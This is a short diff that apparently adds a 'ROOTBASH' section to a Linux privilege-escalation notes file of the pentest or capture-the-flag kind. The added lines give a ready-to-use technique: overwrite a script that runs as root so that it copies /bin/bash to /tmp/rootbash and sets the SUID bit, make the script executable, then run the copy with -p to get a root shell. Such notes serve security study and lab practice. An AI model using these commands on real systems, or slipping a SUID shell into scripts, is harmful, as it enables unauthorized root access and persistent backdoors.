@@ -62,3 +62,19 @@ Check for service running only locally
 ```
 netstat -antpx
 ```
+
+ROOTBASH
+we can use this tecnquie when we found a script running as root, we can modify in this way
+```
+#!/bin/bash
+cp /bin/bash /tmp/rootbash
+chmod +s /tmp/rootbash
+```
+Ensure that overwrite.sh is executable:
+```
+chmod +x /home/user/overwrite.sh
+```
+run and gain a root shell (-p to preserve UID)
+```
+/tmp/rootbash –p
+```
